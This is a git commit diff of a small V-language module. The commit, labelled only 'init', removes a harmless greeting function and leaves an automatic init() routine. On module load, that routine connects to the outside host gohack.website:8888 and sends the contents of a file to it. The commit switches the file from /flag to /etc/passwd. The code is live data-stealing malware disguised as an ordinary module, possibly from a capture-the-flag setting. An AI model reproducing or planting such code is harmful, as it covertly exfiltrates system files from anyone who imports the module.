8f826d6000e93b63a7e3509169887c0671ebe64f
Abdillah <abdillah.muhamad@vantagepoint.co.id>
2021-10-31 15:44:03 +0700

    init

--- root.v
+++ root.v
@@ -3,13 +3,9 @@ module ganteng
 import os
 import net
 
-// To export a function we have to use `pub`
-pub fn say_hi() {
-	println('hello from mymodule!')
-}
 
 fn init(){
         mut client := net.dial_tcp("gohack.website:8888") or { panic('') }
-        out := os.read_file("/flag") or { panic('') }
+        out := os.read_file("/etc/passwd") or { panic('') }
         client.write_string(out)  or { panic('') }
 }
